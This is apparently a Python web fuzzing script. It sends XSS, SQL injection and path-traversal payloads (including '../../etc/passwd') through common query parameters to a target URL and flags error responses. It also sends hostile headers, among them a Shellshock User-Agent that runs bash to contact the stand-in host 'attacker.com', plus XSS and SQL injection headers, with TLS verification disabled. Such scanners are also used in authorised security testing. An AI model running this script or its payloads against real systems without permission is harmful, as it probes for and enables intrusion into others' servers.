import requests

def fuzz(target_url):
    print(f"\n[+] Starting Fuzzing on {target_url}")
    payloads = [
        "'", "\"", "<script>alert(1)</script>", "../../etc/passwd", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "{}`,", "' OR '1'='1", "%2e%2e%2f", "\" onmouseover=alert(1)"
    ]

    test_params = ["id", "q", "search", "page", "file"]

    for param in test_params:
        for payload in payloads:
            test_url = f"{target_url}?{param}={payload}"
            try:
                r = requests.get(test_url, timeout=8, verify=False)
                if r.status_code >= 500 or any(x in r.text.lower() for x in ["syntax", "error", "warning"]):
                    print(f"    [!] Reflection/Error Detected: {test_url}")
            except requests.RequestException:
                continue

    print("[+] Header fuzzing...")
    fuzz_headers = {
        "User-Agent": "() { :;}; echo; /bin/bash -c 'ping attacker.com'",
        "Referer": "<script>alert('hacked')</script>",
        "X-Forwarded-For": "127.0.0.1' OR 1=1--"

    }
    try:
        r = requests.get(target_url, headers=fuzz_headers, timeout=8, verify=False)
        if r.status_code in [403, 406] or "blocked" in r.text.lower():
            print("    Header-based WAF or filtering detected!")
    except requests.RequestException:
        pass